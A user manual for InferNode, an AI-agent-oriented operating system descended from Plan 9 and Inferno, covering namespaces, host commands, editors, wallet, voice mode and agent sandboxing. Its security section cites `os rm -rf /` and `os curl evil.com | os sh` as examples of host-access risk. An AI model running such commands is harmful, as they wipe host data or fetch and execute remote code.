# InferNode User Manual

A practical guide to using InferNode, the AI-agent-friendly operating system.

> **First time?** The fastest way to see what InferNode does is the
> interactive guided tour. Launch Lucia and type `run the tour` in the
> conversation zone, or run `veltro 'run the tour'` from a headless
> shell. See [RUN_TOUR.md](../RUN_TOUR.md). The rest of this manual is
> the reference; the tour is the demo.

---

## Table of Contents

1. [What is InferNode?](#what-is-infernode)
2. [Heritage: Plan 9 → Inferno® → InferNode](#heritage)
3. [Core Philosophy](#core-philosophy)
4. [The Namespace: Your Personal Universe](#the-namespace)
5. [Virtual Devices](#virtual-devices)
6. [Accessing the Host OS](#accessing-the-host-os)
7. [The Shell Profile](#the-shell-profile)
8. [Working with Files](#working-with-files)
9. [Xenith: The Text Environment](#xenith)
10. [The Login Screen](#the-login-screen)
11. [The Text Editor](#the-text-editor)
12. [Wallet and Payments](#wallet-and-payments)
13. [Voice Mode](#voice-mode)
14. [Security and Agent Namespace Isolation](#security-and-agent-namespace-isolation)
15. [Common Tasks](#common-tasks)
16. [Troubleshooting](#troubleshooting)

---

## What is InferNode?

InferNode is an operating system designed for AI agents and the humans who work with them. It provides:

- A **sandboxed environment** where AI agents can work safely
- A **text-first interface** (Xenith) where everything is observable
- A **filesystem-as-API** model where programs communicate via files
- **Network transparency** via the 9P protocol

If you've used Unix, you'll find InferNode familiar. If you've used Plan 9, you'll feel at home. If you're an AI agent, you'll find an environment designed for you.

---

## Heritage

### Plan 9 from Bell Labs (1992)

Plan 9 was the "sequel" to Unix, created by many of the same people (Ken Thompson, Rob Pike, Dennis Ritchie). Its key insight: **everything is a file**, taken seriously.

In Unix, "everything is a file" is a nice idea but inconsistent. Network sockets, process information, and devices all have special APIs.

In Plan 9, this philosophy is complete:
- Network connections are files (`/net/tcp/0/data`)
- Process state is files (`/proc/123/status`)
- The window system is files (`/dev/mouse`, `/dev/draw`)
- Even the keyboard is a file (`/dev/cons`)

### Inferno® (1996)

Inferno® took Plan 9's ideas and made them portable. Instead of running on bare hardware, Inferno® runs as a "hosted" OS on top of other operating systems (macOS, Linux, Windows) or on bare metal.

Key additions:
- **Limbo** - A safe, garbage-collected language (like Go's ancestor)
- **Dis** - A virtual machine that runs Limbo bytecode
- **Styx/9P** - The network protocol that makes filesystems shareable

### InferNode (2024)

InferNode is Inferno® rebuilt for the AI age:
- **64-bit support** for modern hardware (ARM64, AMD64)
- **Xenith** - A text environment designed for AI-human collaboration
- **SDL3 graphics** - Modern GPU-accelerated rendering
- **AI agent isolation** - Namespace-based security for running untrusted agents

---

## Core Philosophy

### Everything is a File

Programs don't use special APIs to communicate. They read and write files.

```sh
# Get the current time
cat /dev/time

# See running processes
ls /prog

# Read mouse position
cat /dev/pointer
```

### The Filesystem is the API

Want to control a window? Write to its control file:
```sh
echo 'delete' > /mnt/xenith/1/ctl
```

Want to query an AI? Write to a file, read the response:
```sh
echo 'What is 2+2?' > /mnt/llm/ask
cat /mnt/llm/ask
```

No SDKs. No libraries. No protocol buffers. Just files.

### Namespaces are Private

Every process has its own view of the filesystem. What you see at `/n/web` might not exist for another process. This is the foundation of security: you can't access what isn't in your namespace.

### Text is Universal

Everything is text when possible. Configuration, communication, data exchange—all text. This means:
- You can inspect anything with `cat`
- You can modify anything with `echo`
- You can script anything with shell pipelines
- AI agents can understand everything

---

## The Namespace

The namespace is the most important concept in InferNode. It's your personal view of the filesystem.

### What is a Namespace?

In traditional operating systems, all processes see the same filesystem. If `/usr/bin/python` exists, everyone sees it.

In InferNode, each process has its own namespace—its own private filesystem view. Two processes can have completely different things at the same path.

```
Process A's view:          Process B's view:
/                          /
├── dev/                   ├── dev/
├── n/                     ├── n/
│   └── web/    ← exists   │   └── (empty)  ← doesn't exist
└── cmd/        ← exists   └── (no cmd)     ← can't run os
```

### How Namespaces are Built

Namespaces start empty and are built up with `bind` and `mount`:

```sh
# Bind a device into the namespace
bind '#C' /cmd              # Now /cmd exists

# Mount a network filesystem
mount 'tcp!server!564' /n/remote

# Bind one directory over another
bind -a /new/bin /dis       # Add /new/bin after /dis in search
```

### Namespace Inheritance

When you spawn a new process:
- **Default:** Child inherits parent's namespace
- **FORKNS:** Child gets a copy (changes don't affect parent)
- **NEWNS:** Child starts with empty namespace

This is how security works: spawn an AI agent with a restricted namespace, and it simply cannot access things outside that namespace.

### Common Namespace Operations

```sh
# See what's mounted where
ns

# Bind device, add after existing contents
bind -a '#I' /net

# Bind device, add before existing contents
bind -b '#U' /

# Bind with creation allowed
bind -c '#C' /cmd

# Mount remote filesystem
mount -a 'tcp!192.168.1.1!564' /n/remote

# Unmount
unmount /n/remote
```

---

## Virtual Devices

InferNode provides functionality through "virtual devices"—kernel-provided filesystems named with `#` followed by a letter.

### Essential Devices

| Device | Name | Purpose |
|--------|------|---------|
| `#C` | cmd | Execute host OS commands |
| `#U` | root | Access host filesystem |
| `#I` | ip | Network stack (TCP/IP) |
| `#p` | prog | Process information |
| `#c` | cons | Console I/O |
| `#m` | mnt | Mount driver |
| `#A` | audio | Host audio I/O and `/dev/audiodev` |

### #C - The Command Device (Host Execution)

The `#C` device lets you run commands on the host operating system:

```sh
# Bind the device (usually done in profile)
bind -a '#C' /

# Now you can use the 'os' command
os ls -la
os which python
os brew list
```

**Security Note:** Any process with `#C` in its namespace can execute arbitrary host commands. Don't bind this for untrusted processes.

### #U - The Root Device (Host Filesystem)

The `#U` device provides access to the host's filesystem:

```sh
# Mount entire host filesystem
bind '#U*' /n/local

# Now /n/local is your host's /
ls /n/local/usr/local/bin
cat /n/local/etc/hosts

# Mount a specific path
bind '#U*/Library/TeX' /n/tex
```

The `*` means "root of host filesystem". Without it, `#U` mounts relative to Inferno®'s root.

### #I - The IP Device (Networking)

```sh
# Initialize networking
bind -a '#I' /net

# Now you can make connections
# (usually done by programs, not manually)
ls /net/tcp
```

### Combining Devices

Devices can be layered:

```sh
# Start with IP networking
bind -a '#I' /net

# Add host filesystem access
bind '#U*' /n/local

# Add command execution
bind -a '#C' /

# Mount a remote 9P server
mount 'tcp!fileserver!564' /n/remote
```

---

## Accessing the Host OS

When running under the emulator (emu), InferNode can interact with the host operating system.

### Running Host Commands: `os`

The `os` command executes programs on the host:

```sh
# Basic usage
os ls -la
os pwd
os whoami

# Get host's PATH
os printenv PATH

# Pipe data through host command
echo "teh quikc fox" | os aspell list

# Use full path if command not in PATH
os /Library/TeX/texbin/xelatex document.tex

# Run with different directory
os -d /tmp ls
```

### Path Translation: `-t` Flag

Host and Inferno paths are different. Use `-t` to translate:

```sh
# Without -t: passes Inferno path (won't work for most host tools)
os cat /n/local/etc/hosts        # Host sees "/n/local/etc/hosts" - wrong!

# With -t: translates to host path
os -t cat /n/local/etc/hosts     # Host sees "/etc/hosts" - correct!
```

### What PATH Does `os` Use?

The `os` command inherits the PATH from whatever launched the emulator:

- **From Terminal:** Your shell's full PATH
- **From macOS app bundle:** Minimal launchd PATH (`/usr/bin:/bin:/usr/sbin:/sbin`)

If tools like `brew` or `/opt/homebrew/bin/*` aren't found, either:
1. Launch from Terminal instead of the app
2. Use full paths: `os /opt/homebrew/bin/aspell list`

### Reading/Writing Host Files

Use `#U` to access host files directly from Inferno:

```sh
# Mount host filesystem
bind '#U*' /n/local

# Read a host file
cat /n/local/etc/hosts

# Write to a host file
echo 'hello' > /n/local/tmp/test.txt

# Copy between Inferno and host
cp /dis/sh /n/local/tmp/inferno-shell.dis
```

### Practical Examples

**Spell-check in Xenith:**
```
|os aspell list
```

**Format Go code:**
```
|os gofmt
```

**Run LaTeX:**
```sh
os /Library/TeX/texbin/xelatex mydocument.tex
```

**Use GitHub CLI:**
```sh
os gh pr list
os gh issue view 42
```

---

## The Shell Profile

When you start a login shell (`sh -l`), it runs `/lib/sh/profile` to set up your environment.

### What the Profile Does

```sh
#!/dis/sh.dis
load std                          # Load standard shell builtins

path=(/dis .)                     # Command search path

user="{cat /dev/user}             # Get username

mount -ac {mntgen} /n             # Mount namespace generator

bind -a '#I' /net                 # Initialize networking

# Mount LLM if available
mount -A 'tcp!127.0.0.1!5640' /mnt/llm >[2] /dev/null

# Setup home directory from host
if {~ $emuhost MacOSX Linux}{
    bind '#U*' /n/local
    home=/n/local/^`{echo 'echo $HOME' | os sh}
}

# Create and bind tmp
bind -bc $home/tmp /tmp

cd $home                          # Start in home directory
```

### Key Variables

| Variable | Purpose | Example |
|----------|---------|---------|
| `$path` | Command search path | `/dis` `.` |
| `$home` | Home directory | `/n/local/Users/yourname` |
| `$user` | Username | `yourname` |
| `$emuhost` | Host OS type | `MacOSX`, `Linux` |

### Customizing Your Environment

Create `$home/lib/profile` for personal customizations:

```sh
# ~/lib/profile
# Personal InferNode configuration

# Add custom command directory
path=(/n/local/usr/local/bin $path)

# Aliases via shell functions
fn gst { os git status }
fn gd { os git diff }

# Set editor
EDITOR=xenith
```

### The `#C` Trap

Note that the profile uses `os sh` to get `$HOME`. This means `#C` gets bound early. Any process that inherits this namespace (including Xenith) will have host command access.

---

## Working with Files

### Inferno Paths vs Host Paths

```
Inferno path:  /n/local/Users/yourname/Documents
Host path:     /Users/yourname/Documents
```

The `#U*` device maps host paths into Inferno's namespace at whatever mount point you choose.

### File Operations

```sh
# List files
ls /dis
ls -l /n/local/tmp

# Read files
cat /dev/time
cat /n/local/etc/hosts

# Write files
echo 'hello' > /tmp/test.txt

# Copy files
cp source dest
cp /n/local/file.txt /tmp/

# Remove files
rm /tmp/test.txt

# Create directories
mkdir /tmp/newdir
mkdir -p /tmp/a/b/c
```

### Text Processing

```sh
# Word wrap to 80 columns
fmt -l 80 document.txt

# Count lines/words/chars
wc file.txt

# Sort lines
sort file.txt

# Find unique lines
uniq file.txt

# Search for patterns
grep pattern file.txt
```

### Piping Through Host Tools

When Inferno tools aren't enough, pipe through the host:

```sh
# Use host's jq for JSON
cat data.json | os jq '.items[]'

# Use host's sed for complex substitution
cat file | os sed 's/old/new/g'

# Use host's python
echo 'print(2+2)' | os python3
```

---

## Xenith

Xenith is InferNode's text environment—a fork of Acme designed for AI-human collaboration.

### Starting Xenith

```sh
# From the command line
xenith

# With dark theme
xenith -t dark

# The macOS app bundle runs this automatically
```

### Basic Concepts

- **Windows** contain text (files, command output, scratch)
- **Tag line** at top of each window shows commands
- **Mouse chording** for selection and execution
- **Everything is text** that can be edited

### Mouse Actions

| Button | Action |
|--------|--------|
| Left | Select text |
| Middle | Execute selection as command |
| Right | Search/open selection |

### Commands in Tags

Click middle button on any word to execute it:
- `Put` - Save file
- `Del` - Delete window
- `New` - Create new window
- `Look` - Search for selection

### Piping Through External Commands

Select text, then middle-click on a pipe command:

```
|fmt -l 80          # Wrap selection to 80 columns
|os sort            # Sort lines via host
|os aspell list     # Spell check via host
<os date            # Insert host's date
>output.txt         # Write selection to file
```

### The 9P Interface

Xenith exposes itself as a filesystem at `/mnt/xenith/`:

```
/mnt/xenith/
├── 1/              # Window 1
│   ├── body        # Text content
│   ├── ctl         # Control commands
│   ├── tag         # Tag line
│   └── event       # Event stream
├── 2/              # Window 2
│   └── ...
├── new             # Create window (write to get id)
└── focus           # Currently focused window
```

This is how AI agents interact with Xenith—by reading and writing files.

---

## The Login Screen

When InferNode boots with a GUI, the login screen (`wm/logon`) runs before the window manager. It handles secstore authentication and loads encrypted keys into factotum.

### First Boot

On first boot, no secstore account exists. The login screen prompts "First boot — choose a secstore password." You must enter the password twice to confirm (prevents typos on this critical password). After confirmation, the secstore account is created and boot proceeds. All keys added during the session (wallet keys, API keys, email credentials) are automatically saved to secstore.

### Normal Boot

The login screen prompts for your secstore password. On successful authentication (PAK protocol), all stored keys are loaded into factotum. The system then boots with all credentials available.

If the password is incorrect, the login screen stays up and shows the error with a choice: press **Enter** to try again, or **Escape** to continue without secstore. The Escape option warns that keys and secrets will not be available and AI integration may not work.

### Skipping Login

Press **Escape** twice to skip secstore unlock. The first press shows a warning ("Keys won't persist"), the second confirms. The system boots with an empty factotum — wallet accounts won't be available and API keys must be provisioned from environment variables. The Keyring and Settings apps will show that key persistence is inactive.

### Headless Mode

When no display is available (headless server, Jetson), set the `SECSTORE_PASSWORD` environment variable on the host before launching emu. The profile detects it and unlocks secstore automatically:

```sh
export SECSTORE_PASSWORD=mypassword
emu -r. sh -l -c "your_command"
```

The login screen detects that keys are already loaded and skips the password prompt. If `SECSTORE_PASSWORD` is not set, factotum starts empty and keys must be provisioned via environment variables (e.g., `ANTHROPIC_API_KEY`).

### Key Persistence

Keys are encrypted with AES-256-GCM and stored in secstore at `usr/inferno/secstore/<username>/`. Back up this directory — there is no password recovery mechanism. If you forget your secstore password, the encrypted keys are permanently lost (this is by design, following Plan 9's security model).

The `secstored` service runs on TCP port 5356 and can serve keys to remote machines:

```sh
# On the remote machine (e.g., Jetson)
auth/factotum -S tcp!mac-ip!5356 -u username -P password
```

### Adding API Keys

After logging in, add API keys via the **Keyring** app (right-click desktop, select Keyring). Select "Add API Key", enter the service name (e.g., `anthropic` or `brave`), and the key value. Keys are stored in factotum and automatically persisted to secstore.

If no API key is configured when Veltro starts, it will display a guidance message directing you to the Keyring app.

---

## The Text Editor

InferNode includes a built-in text editor (`wm/editor`) with modern editing features and a 9P interface for agent integration.

### Starting the Editor

```sh
# From the Inferno shell
editor /path/to/file

# From Lucifer (launches in presentation zone)
# Use the 'launch' or 'editor' Veltro tool
```

### Keyboard Shortcuts

| Shortcut | Action |
|----------|--------|
| Ctrl-Z | Undo |
| Ctrl-Y | Redo |
| Ctrl-F | Find |
| Ctrl-H | Find & Replace |
| Ctrl-S | Save |
| Ctrl-A | Select all / move to beginning of line |
| Ctrl-E | Move to end of line |
| Ctrl-K | Delete to end of line |

### Selection

- **Click** — Position cursor
- **Double-click** — Select word
- **Triple-click** — Select line
- **Click and drag** — Select range

### Find & Replace

Press **Ctrl-H** to enter find & replace mode. The status bar shows the search prompt. Type the search term and press Enter. Then type the replacement and press Enter.

- **Replace** — Replaces the next occurrence (wraps around)
- **Replace All** — Replaces every occurrence in the document

### 9P Interface for Agents

The editor exposes a filesystem at `/edit/` that Veltro agents can use to read and modify open documents:

```sh
# Open a file programmatically
echo 'open /appl/cmd/hello.b' > /edit/ctl

# Read document text
cat /edit/1/body

# Insert text at line 5, column 1
echo 'insert 5 1 # new comment' > /edit/1/ctl

# Find and replace all (tab-separated)
echo 'replaceall oldname	newname' > /edit/1/ctl

# Jump to line 42
echo 'goto 42' > /edit/1/ctl
```

See [docs/XENITH.md](XENITH.md) for the full IPC reference.

---

## Wallet and Payments

InferNode includes a native cryptocurrency wallet that enables both users and AI agents to manage accounts and make payments. Everything follows Plan 9 principles: wallet accounts are files, secrets live in factotum.

### Starting the Wallet

The wallet GUI app launches from Lucifer or the window manager:

```sh
# From Lucifer presentation zone (via Veltro)
# Or directly:
wm/wallet
```

wallet9p (the 9P server) starts automatically when needed.

### Managing Accounts

**From the GUI:**
- Right-click → **New Ethereum Account** to create an account
- Right-click → **Import Private Key** to import an existing key
- Select an account to see its address and balance
- Use the network dropdown to switch between Ethereum Mainnet, Sepolia, Base, etc.

**From the shell:**

```sh
# Create an account
echo 'eth ethereum myaccount' > /n/wallet/new

# Check address
cat /n/wallet/myaccount/address

# Check balance
cat /n/wallet/myaccount/balance

# Switch network
echo 'network Base' > /n/wallet/ctl
```

### Agent Payments

Veltro agents can use the `wallet` and `payfetch` tools:

- **`wallet`** — List accounts, check balances, sign transactions
- **`payfetch`** — HTTP client that automatically handles x402 payment flows

When a server returns HTTP 402 Payment Required, `payfetch` parses the payment requirements, checks the wallet budget, signs the authorization, and retries — all transparently.

Budget enforcement is server-side in wallet9p. Agents cannot bypass spending limits.

### Key Security

- Private keys live in factotum, never in wallet9p's memory
- Agents can queue payment proposals, but raw hash signing is not exposed through the agent wallet grant
- Wallet access is namespace-gated: agents need explicit `"/n/wallet"` in their capabilities
- `/mnt/factotum/ctl` is blocked by nsconstruct — agents never see raw keys

See [docs/WALLET-AND-PAYMENTS.md](WALLET-AND-PAYMENTS.md) for the full architecture, crypto primitives, and API reference.

---

## Voice Mode

Lucia can listen and speak. Voice mode is hands-free: it waits for a
wake phrase, captures an utterance, sends it as a turn, and speaks the
reply.

### Turning voice mode on and off

Click the **Voice** row under Resources, press **Esc** then **V**, or
type `/voice mode on` in the conversation. Press **Esc**, click the row
again, or type `/voice mode off` to leave. Saying "keyboard" also
returns to typing.

The installed wake phrase is **hey jarvis**. "hey lucia" does not wake
the shipped openWakeWord model.

### Which microphone is in use

Two files answer two different questions.

**Host device.** `/dev/audiodev` is the list, the current choice, and
the capture verdict for `#A` (bound on `/dev` at emulator start):

```
; cat /dev/audiodev
in selected default
in device 'MacBook Pro Microphone'
in device 'TeoPods'
in device 'BlackHole 2ch'
out selected default
out device 'TeoPods'
out device 'BlackHole 2ch'
out device 'MacBook Pro Speakers'
capture idle
```

`in selected default` means InferNode is following the operating
system's default input. A quoted name means that device was chosen
explicitly. The `in device` lines are every input this emulator can
open.

The last line is whether the most recent capture heard anything — not
only a live one:

| Line | Meaning |
|------|---------|
| `capture idle` | No capture has run yet, or it delivered no data |
| `capture active` | At least one non-zero sample arrived |
| `capture silent` | The device opened and returned only zeros |

Backends that cannot select a device print a single line,
`unsupported` (the headless macOS build, and every non-SDL3 platform).
The name-selection commands below are the macOS SDL3 emulator.

**Speech routing.** Lucia hears whatever the speech provider is
configured to read. Writes to `/n/speech/ctl` are forwarded; they are
**not** echoed there. Read the provider:

```
; cat /n/speech/ctl          # look at the provider line
; cat /n/speechshim/ctl      # micmode, capturedev, audiodev
```

Lucia's boot sets `provider /n/speechshim`. On that `ctl`:

| Key | What it means |
|-----|----------------|
| `micmode device` | The shim reads PCM from `capturedev` (or from `audiodev` when `capturedev` is empty) and feeds the helpers. This is what the Parakeet installer writes. |
| `micmode helper` | The helper CLIs open the host default microphone themselves. `/dev/audiodev` does not choose that microphone. |
| `capturedev` | Namespace path of the capture file. Empty means "use `audiodev`". |

If `micmode` is `helper`, switch it before picking a device:

```
echo 'micmode device' > /n/speech/ctl
```

### Choosing a local input device

Names may be written with or without the quotes `/dev/audiodev` prints:

```
echo 'in MacBook Pro Microphone' > /dev/audiodev
echo 'in default' > /dev/audiodev
```

An unknown name is refused (`audiodev: no device of that name`).
Selection takes effect immediately: an already-open capture stream is
reopened on the new device. `out <name>` selects the playback device
the same way.

To pin a device before the emulator starts:

```
export INFERNODE_AUDIO_IN='MacBook Pro Microphone'
export INFERNODE_AUDIO_OUT='MacBook Pro Speakers'
```

An unknown `INFERNODE_AUDIO_IN` is not refused. `/dev/audiodev` still
shows the requested name; the first capture warns on stderr and opens
the system default instead.

Changing the operating system's default input after InferNode has
already opened capture does not move that stream. Write to
`/dev/audiodev`, or set the environment variable and restart.

### Using a microphone on another InferNode

`capturedev` is a path, so a remote `/dev/audio` imported over 9P is
configured the same way as the local one:

```
mount -A 'tcp!<phone-ip>!17010' /n/phone
echo 'capturedev /n/phone/audio' > /n/speech/ctl
echo 'micmode device' > /n/speech/ctl
```

Confirm on the provider (`capturedev /n/phone/audio` and
`micmode device`). `capturedev default` clears the override and
captures from `audiodev` again.

The phone frontend that exports that `/dev` is a separate setup — see
[SPEECH-REMOTE-AUDIO.md](SPEECH-REMOTE-AUDIO.md) (topology 3, remote
capture device) and `tools/android-speech-frontend.sh`. On the
processing host, `sh /lib/voice/speech-capture tcp!<phone-ip>!17010`
performs the mount and ctl writes above. The development export is
unauthenticated; keep it on a trusted local or Tailscale network.

### It opens but hears nothing

The Voice tile stays **waiting**. The wake phrase never fires. No
error appears on the tile, and `/dev/audio` still reads at full rate.

That is what a silenced or virtual input looks like. Capture
succeeds; every sample is zero. Virtual inputs are common — Voicemod,
Loopback, Hue Sync, ARK, Continuity Camera, BlackHole — and any of
them can become the operating-system default. If the default belongs
to an application that is not running, InferNode reports no fault.

Confirm after a few seconds of voice mode, or after speaking:

```
; cat /dev/audiodev
```

`capture silent` means this layer heard nothing. Pick a real
microphone by name, or run `tools/diagnose-virtual-audio.sh` from the
host checkout (it needs a built emulator). That script separates
emulator playback, emulator capture, the driver, and microphone
authorization. Mute is a device property: it survives reboot and is
not shown by `/dev/audiodev`.

The other cause of the same silence is platform microphone
authorization. On macOS, grant Microphone access to the application
that launched InferNode (Terminal, the InferNode app bundle, or the
IDE). A built-in microphone that still reports `capture silent` after
it is selected is this case, not a wrong name.

A capture that stays all-zero for two seconds also prints once to the
emulator's stderr:

```
audio-sdl3: the capture device has produced nothing but silence for 2s — check the input device in #A/audiodev and microphone authorization
```

That line is not shown on the Voice tile.

`Voice: no speech heard` on the tile is different: the wake phrase
already fired, then the listen turn heard nothing. That is a timeout
after wake, not a device that never delivered signal.

### The Voice resource tile

The row is labelled **Voice**. A status word sits on the right. A
small block on the left changes colour.

| Tile | Meaning |
|------|---------|
| **Voice** / `idle`, dim | Voice mode is off |
| **Voice** / `waiting`, green | Voice mode is on and waiting for **hey jarvis**. This is healthy. It is also how a silent device looks. |
| **Voice** / `listening`, highlighted | The wake phrase was heard; Lucia is capturing an utterance |
| **Voice:** *reason* / `error`, red | A speech helper failed. The reason is on the label, truncated. |
| **Voice** / `starting`, green | The click was registered. If this sticks, the voice daemon did not start. |

The conversation pane separately shows `Listening...` and
`Sending in Ns` while a turn is in flight. Those are not the resource
tile.

---

## Security and Agent Namespace Isolation

### The Namespace is the Security Boundary

InferNode's security model is simple: **a process can only access what's in its namespace**. The Veltro harness uses this primitive to sandbox each running agent — see the README "Terminology" section for the harness/agent distinction.

A running agent in a restricted namespace:
```
/
├── mnt/
│   └── xenith/     ← Can edit text
├── n/
│   └── llm/        ← Can query AI
└── tmp/            ← Can use temp files
```

Cannot access:
- `/cmd` (no host command execution)
- `#U` (no host filesystem)
- `/net` (no network, unless explicitly granted)

### Creating a Restricted Namespace

```limbo
# In Limbo code
sys->pctl(Sys->NEWNS, nil);   # Start with empty namespace

# Only bind what the agent needs
sys->bind("/mnt/xenith", "/mnt/xenith", Sys->MREPL);
sys->bind("/tmp", "/tmp", Sys->MREPL|Sys->MCREATE);
```

### The `os` Command Risk

If `#C` is bound, any process can execute host commands:

```sh
os rm -rf /          # Catastrophic on host!
os curl evil.com | os sh   # Remote code execution!
```

**For trusted users:** This is convenient.
**For AI agents:** Don't bind `#C` in their namespace.

### Current Default Behavior

The default profile binds `#C` early (to get `$HOME`), so Xenith windows have full host access. This is fine when humans are in control.

For untrusted AI agents, you would:
1. Create a new namespace
2. Bind only safe resources
3. Spawn the agent in that namespace

---

## Common Tasks

### Reformatting Text

```sh
# Wrap prose to 70 columns (default)
fmt file.txt

# Wrap to specific width
fmt -l 80 file.txt

# In Xenith, select text and:
|fmt -l 80
```

### Using Host Package Managers

```sh
# List installed packages
os brew list

# Search for package (but ask user to install)
os brew search aspell

# On Linux
os apt list --installed
os dpkg -l | os grep vim
```

### Network Diagnostics

```sh
# Check if networking is set up
ls /net

# Ping via host
os ping -c 3 google.com

# DNS lookup via host
os nslookup example.com

# HTTP fetch via host
os curl -s https://example.com
```

### Working with Git

```sh
# All git operations through host
os git status
os git add .
os git commit -m "message"
os git push

# GitHub CLI
os gh pr list
os gh issue create --title "Bug" --body "Description"
```

### Processing JSON

InferNode prefers text, but when you must deal with JSON:

```sh
# Pretty print
cat data.json | os jq .

# Extract field
cat data.json | os jq '.name'

# Filter array
cat data.json | os jq '.items[] | select(.active)'
```

### Running Python Scripts

```sh
# One-liner
echo 'print(2+2)' | os python3

# Run a script from host filesystem
os python3 /path/to/script.py

# Run a script accessible via Inferno path (with translation)
os -t python3 /n/local/path/to/script.py
```

---

## Troubleshooting

### Command Not Found

```sh
; somecommand
sh: somecommand: '/dis/somecommand' file does not exist
```

**For Inferno® commands:** Check `$path` and `/dis`:
```sh
echo $path
ls /dis | grep somecommand
```

**For host commands:** Use `os`:
```sh
os somecommand
os which somecommand
```

### `os` Can't Find Host Commands

If `os which brew` fails, the command isn't in the inherited PATH.

**Solution 1:** Use full path:
```sh
os /opt/homebrew/bin/brew list
```

**Solution 2:** Launch emu from Terminal (not app bundle):
```sh
./emu/MacOSX/o.emu -r. sh -l -c 'xenith -t dark'
```

### Permission Denied

```sh
; cat /cmd/clone
cat: can't open /cmd/clone: does not exist
```

The `#C` device isn't bound. Either:
```sh
bind -a '#C' /
```
Or this was intentional (restricted namespace).

### Mount Failed

```sh
; mount 'tcp!server!564' /n/remote
mount: ...
```

Check:
1. Is networking initialized? `ls /net`
2. Is the server running?
3. Is the port correct?
4. Network path: `os ping server`

### Namespace Confusion

```sh
; ls /mnt/llm
ls: /mnt/llm: does not exist
```

The mount point doesn't exist in your namespace. Check what's mounted:
```sh
ns
```

Mount it if needed:
```sh
mount -A 'tcp!127.0.0.1!5640' /mnt/llm
```

### Voice Mode Hears Nothing

The Voice tile stays **waiting** and the wake phrase never fires. See
[Voice Mode](#voice-mode): read `/dev/audiodev` for `capture silent`,
select a real input device, and run `tools/diagnose-virtual-audio.sh`
if the device is virtual or muted.

---

## Quick Reference

### Essential Commands

| Command | Purpose |
|---------|---------|
| `ls` | List files |
| `cat` | Display file contents |
| `echo` | Print text |
| `cp` | Copy files |
| `rm` | Remove files |
| `mkdir` | Create directory |
| `cd` | Change directory |
| `pwd` | Print working directory |
| `bind` | Bind namespace |
| `mount` | Mount filesystem |
| `ns` | Show namespace |
| `os` | Run host command |

### Essential Paths

| Path | Contents |
|------|----------|
| `/dis` | Executable programs |
| `/dev` | Devices (console, mouse, etc.) |
| `/n` | Mount points |
| `/tmp` | Temporary files |
| `/prog` | Process information |
| `/net` | Network stack |
| `/cmd` | Host command interface |
| `/mnt/xenith` | Xenith 9P interface |
| `/dev/audiodev` | Audio device list, selection, and capture verdict |
| `/n/speechshim/ctl` | Speech routing (`micmode`, `capturedev`, `audiodev`) |

### Essential Devices

| Device | Purpose |
|--------|---------|
| `#C` | Host command execution |
| `#U` | Host filesystem |
| `#I` | IP networking |
| `#p` | Process info |
| `#c` | Console |
| `#A` | Host audio (`/dev/audio`, `/dev/audiodev`) |

---

## Further Reading

- [Inferno® Documentation](https://inferno-os.org/inferno/docs.html) - Official docs, papers, guides
- [Inferno® Manual Pages](https://inferno-os.org/inferno/man/1/0intro.html) - Online man pages
- [Powerman Inferno Mirror](https://powerman.name/Inferno/) - Updated man pages and tutorials
- [A Descent into Limbo](http://doc.cat-v.org/inferno/4th_edition/limbo_language/descent) - Limbo language tutorial by Brian Kernighan
- [Plan 9 Programmer's Manual](http://man.cat-v.org/plan_9/)
- [The Styx Architecture for Distributed Systems](http://doc.cat-v.org/inferno/4th_edition/styx)
- [Structural Regular Expressions](http://doc.cat-v.org/bell_labs/structural_regexps/)
- [Awesome Inferno®](https://github.com/henesy/awesome-inferno) - Curated resource list
- [Remote Speech: 9P Audio Composition](SPEECH-REMOTE-AUDIO.md) - Remote microphones and speech topologies

---

*This manual is a living document. Contributions welcome.*
